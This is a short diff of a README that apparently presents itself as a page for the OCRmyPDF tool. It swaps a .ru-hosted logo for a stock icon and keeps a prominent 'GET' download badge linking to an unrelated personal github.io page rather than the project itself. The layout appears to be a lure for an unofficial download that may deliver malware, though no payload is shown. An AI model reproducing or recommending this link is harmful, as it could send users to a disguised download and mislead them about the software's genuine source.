@@ -1,6 +1,6 @@
 # OCRmyPDF OCR — Searchable Documents, Tesseract Processing & PDF Workflows
 
-![OCRmyPDF Logo](https://xeonlive.ru/images/PDF-Commander/OCRmyPDF.png)
+![OCRmyPDF Logo](https://cdn-icons-png.freepik.com/256/5453/5453746.png)
 
 [![GET — OCRmyPDF](https://img.shields.io/badge/GET%20%E2%80%94%20OCRmyPDF-0078D6?style=for-the-badge&logoColor=white)](https://majlietq717873.github.io/.github/OCRmyPDF-OCR)
 
